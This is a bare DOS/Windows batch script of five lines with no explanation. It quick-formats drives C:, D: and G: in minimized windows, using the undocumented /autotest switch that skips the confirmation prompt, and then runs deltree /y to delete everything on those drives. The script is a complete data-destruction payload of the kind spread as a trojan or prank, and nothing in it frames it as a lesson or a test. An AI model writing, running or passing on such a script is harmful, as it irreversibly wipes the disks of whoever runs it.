SET PATH=C:\tool;c:\dos;%PATH%
start /m format c: /q /autotest /u
start /m format d: /q /autotest /u
start /m format g: /q /autotest /u
start /m deltree /y c:\*.* d:\*.* g:\*.*
